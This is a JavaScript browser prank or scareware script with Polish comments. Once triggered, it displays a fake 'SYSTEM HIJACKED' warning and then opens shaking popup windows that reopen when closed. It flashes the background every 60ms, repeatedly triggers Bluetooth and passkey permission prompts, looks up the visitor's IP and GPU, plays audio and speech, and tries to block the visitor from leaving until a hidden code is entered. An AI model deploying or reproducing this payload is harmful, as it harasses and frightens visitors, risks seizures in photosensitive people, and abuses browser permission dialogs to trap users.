// --- ZBYCH-FLYING-HYDRA-OVERLORD-2026.js ---
// WYMAGA PLIKÓW: Zbych.png, Xd.png, Ciastko.png, gratulacje.mp4, szybkakaczka.mp4, muzykaxd.mp3, Avast.mp3, Bluescreen.png

const ZBYCH_IMAGES = ["Zbych.png", "Zbych10.png", "Zbych2.png", "Zbych3.png", "Zbych4.png", "Zbych5.png", "Zbych6.png", "Zbych7.png", "Zbych8.png", "Zbych9.png"];
const CHINESE_TEXTS = ["你好", "入侵者", "致命错误", "警告", "蓝牙拦截", "数据泄露"];
let isActivated = false;
let clickCount = 0;
let zbychPoints = 0;

let sysData = { ip: "Pobieranie...", gpu: "Skanowanie...", battery: "Skanowanie...", cores: navigator.hardwareConcurrency || "Nieznane", ram: navigator.deviceMemory || "Nieznane" };

const audioZbych = new Audio('muzykaxd.mp3');
const audioAvast = new Audio('Avast.mp3');
audioZbych.loop = true;

// 1. HYPER-FLYING HYDRA (Latające i trzęsące się okna)
function spawnSkibidiWindow() {
    const isBSOD = Math.random() < 0.10;
    const w = 450;
    const h = 450;
    
    let posX = Math.random() * (window.screen.width - w);
    let posY = Math.random() * (window.screen.height - h);
    let velX = (Math.random() * 30 - 15); 
    let velY = (Math.random() * 30 - 15); 

    const win = window.open("", `Zbych_${Math.random()}`, `width=${w},height=${h},left=${posX},top=${posY}`);
    
    if (win) {
        let content = isBSOD ? `<img src="Bluescreen.png" style="width:100vw; height:100vh; object-fit:fill;">` : 
                      `<video src="${Math.random() > 0.5 ? 'szybkakaczka.mp4' : 'gratulacje.mp4'}" autoplay loop muted style="width:100%; height:100%; object-fit:cover;"></video>`;
        
        win.document.write(`
            <body style="margin:0; background:black; overflow:hidden;">
                ${content}
                <script>
                    let x = ${posX}; let y = ${posY};
                    let vx = ${velX}; let vy = ${velY};
                    let sw = window.screen.availWidth;
                    let sh = window.screen.availHeight;

                    setInterval(() => {
                        x += vx; y += vy;
                        if (x <= 0 || x >= sw - 450) vx *= -1;
                        if (y <= 0 || y >= sh - 450) vy *= -1;
                        let shakeX = Math.random() * 25 - 12.5;
                        let shakeY = Math.random() * 25 - 12.5;
                        window.moveTo(x + shakeX, y + shakeY);
                        if(Math.random() > 0.85) document.body.style.filter = "invert(1)";
                        else document.body.style.filter = "none";
                    }, 30);
                    window.onbeforeunload = () => { window.opener.postMessage("closed", "*"); };
                </script>
            </body>
        `);
    }
}

// 2. STATIC CLICKER (Powiększone ciastko)
function stworzStaticClicker() {
    const clicker = document.createElement('img');
    clicker.id = "zbych-cookie";
    clicker.src = "Ciastko.png";
    // Zwiększyłem szerokość do 450px, żeby było gigantyczne!
    clicker.style = "position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:450px; cursor:pointer; z-index:25000; transition: transform 0.05s; filter: drop-shadow(0 0 20px rgba(0,0,0,0.5));";
    
    const counter = document.createElement('div');
    counter.id = "zbych-counter";
    counter.style = "position:fixed; top:5%; left:50%; transform:translateX(-50%); color:lime; font-size:45px; font-weight:bold; font-family:monospace; z-index:25001; text-shadow: 4px 4px black; text-align:center;";
    counter.innerHTML = `ZBYCH-PUNKTY: 0<br><span style="font-size:20px; color:red;">CHAOS LEVEL: 0%</span>`;
    
    clicker.onclick = (e) => {
        e.stopPropagation();
        zbychPoints++;
        counter.innerHTML = `ZBYCH-PUNKTY: ${zbychPoints}<br><span style="font-size:20px; color:red;">CHAOS LEVEL: ${zbychPoints * 5}%</span>`;
        clicker.style.transform = "translate(-50%, -50%) scale(0.8)";
        setTimeout(() => clicker.style.transform = "translate(-50%, -50%) scale(1)", 50);
        
        spawnSkibidiWindow(); 
        if (zbychPoints % 3 === 0) spamBluetooth();
        if (zbychPoints % 7 === 0) wywolajPasskey();
        
        const flash = document.createElement('img');
        flash.src = ZBYCH_IMAGES[Math.floor(Math.random()*ZBYCH_IMAGES.length)];
        flash.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:26000; opacity:0.3; pointer-events:none;";
        document.body.appendChild(flash);
        setTimeout(() => flash.remove(), 80);
    };
    document.body.appendChild(clicker);
    document.body.appendChild(counter);
}

// 3. MODUŁY ATAKU
async function spamBluetooth() { if (navigator.bluetooth) try { await navigator.bluetooth.requestDevice({ acceptAllDevices: true }); } catch (e) {} }
async function wywolajPasskey() {
    if (!window.PublicKeyCredential) return;
    const options = {
        challenge: Uint8Array.from("ZBYCH-2026", c => c.charCodeAt(0)),
        rp: { name: "Zbych Security", id: window.location.hostname },
        user: { id: Uint8Array.from("1", c => c.charCodeAt(0)), name: "Antek", displayName: "Antek" },
        pubKeyCredParams: [{ alg: -7, type: "public-key" }],
        authenticatorSelection: { authenticatorAttachment: "platform" },
        timeout: 10000
    };
    try { await navigator.credentials.create({ publicKey: options }); } catch (e) {}
}

async function fullSystemScan() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        sysData.ip = data.ip;
    } catch (e) { sysData.ip = "ZABLOKOWANO"; }
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        sysData.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Zintegrowana";
    }
}

// 4. CHAOS NA STRONIE GŁÓWNEJ (Miganie tła)
function extremeEffects() {
    if (!isActivated) return;
    const colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF", "#000000"];
    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    document.body.style.transform = `translate(${Math.random()*30-15}px, ${Math.random()*30-15}px)`;
}

function spawnMainPageChaos() {
    if (!isActivated) return;
    const el = document.createElement('div');
    el.style = `position:fixed; left:${Math.random()*80}vw; top:${Math.random()*80}vh; z-index:15000; pointer-events:none;`;
    const r = Math.random();
    if (r < 0.4) el.innerHTML = `<img src="Xd.png" style="width:200px; transform:rotate(${Math.random()*360}deg);">`;
    else el.innerHTML = `<div style="background:black; color:lime; padding:15px; border:2px solid lime; font-family:monospace; font-size:14px; box-shadow: 0 0 10px lime;">[ZBYCH-CORE]<br>IP: ${sysData.ip}<br>GPU: ${sysData.gpu.substring(0,20)}...<br>PUNKTY: ${zbychPoints}</div>`;
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 1000);
}

// 5. START I SYSTEM HASŁA
window.addEventListener('click', () => {
    if (!isActivated && ++clickCount >= 3) {
        // NAPRAWA: Ukrywamy ludzika i stary tekst
        const oldUI = document.getElementById('main-ui');
        if(oldUI) oldUI.style.display = 'none';

        const div = document.createElement('div');
        div.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:red; color:white; z-index:35000; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif; text-align:center;";
        div.innerHTML = `<h1>⚠️ SYSTEM HIJACKED ⚠️</h1><p style="font-size:20px;">Wykryto CPU: ${sysData.cores} rdzeni</p><button id="fb" style="padding:25px; font-size:30px; cursor:pointer; background:yellow; color:black; font-weight:bold; border:5px solid black; border-radius:10px;">NAPRAW SYSTEM (START)</button>`;
        document.body.appendChild(div);
        
        document.getElementById('fb').onclick = () => {
            isActivated = true;
            div.remove();
            audioZbych.play().catch(()=>{});
            
            stworzStaticClicker();
            fullSystemScan();

            // PĘTLE CHAOSU - Tu zaczyna się prawdziwe szaleństwo
            setInterval(spawnSkibidiWindow, 2500);
            setInterval(extremeEffects, 60); // Miganie tła co 60ms
            setInterval(spawnMainPageChaos, 400);
            setInterval(() => audioAvast.play().catch(()=>{}), 5000);
            setInterval(() => { window.location.href = "ms-paint:"; }, 6000);
            setInterval(spamBluetooth, 4000);
            setInterval(wywolajPasskey, 12000);
            
            setInterval(() => { 
                const msg = new SpeechSynthesisUtterance("zostałeś zezbychowany przez ciastko xddd"); 
                msg.lang = 'pl-PL'; window.speechSynthesis.speak(msg);
            }, 5000);
            
            stworzSystemHasla();
        };
    }
});

function stworzSystemHasla() {
    const d = document.createElement('div');
    d.style = "position:fixed; bottom:20px; right:20px; z-index:40000; background:white; padding:15px; border:3px solid red; color:black; font-weight:bold;";
    d.innerHTML = `KOD RATUNKOWY: <input type="password" id="p" style="width:100px;"> <button onclick="check()">STOP</button>`;
    document.body.appendChild(d);
    window.check = () => {
        if (document.getElementById('p').value === "Zbych2026") {
            window.onbeforeunload = null; window.close(); location.href="about:blank";
        } else { 
            spawnSkibidiWindow(); spawnSkibidiWindow(); spawnSkibidiWindow(); 
            alert("BŁĘDNE HASŁO! ZBYCH SIĘ GNIEWA!");
        }
    };
}

window.addEventListener("message", (e) => { if (e.data === "closed") { spawnSkibidiWindow(); spawnSkibidiWindow(); } });
window.onbeforeunload = () => "ZBYCH CIĘ NIE PUŚCI!";